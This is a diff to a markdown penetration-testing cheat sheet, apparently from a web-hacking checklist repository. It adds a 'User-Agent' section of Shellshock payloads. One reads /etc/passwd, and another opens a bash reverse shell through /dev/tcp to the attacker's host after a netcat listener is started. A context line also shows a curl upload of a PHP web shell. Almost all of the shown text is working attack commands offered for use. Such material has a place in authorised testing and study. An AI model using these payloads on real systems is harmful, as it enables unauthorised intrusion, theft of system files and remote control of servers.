@@ -187,6 +187,18 @@ echo "<pre>$output</pre>";
 - __`curl -F "Filedata=@./shell.php" <url_of_upload>`__
 
 
+## User-Agent
+__Payload:__
+- __`() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`__
+![image4](/Image/user_agent.jpg)
+
+__Start netcat__
+- __command:__ - __`nc -nvlp 1234`__
+- __`use the below payload in user agent command:`__
+    - __`() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<yourip>/1234 0>&1'`__
+
+![image5](/Image/user_agent1.jpg)
+
 
 # Check list
 - [x] [Open redirect](open_redirect.md)
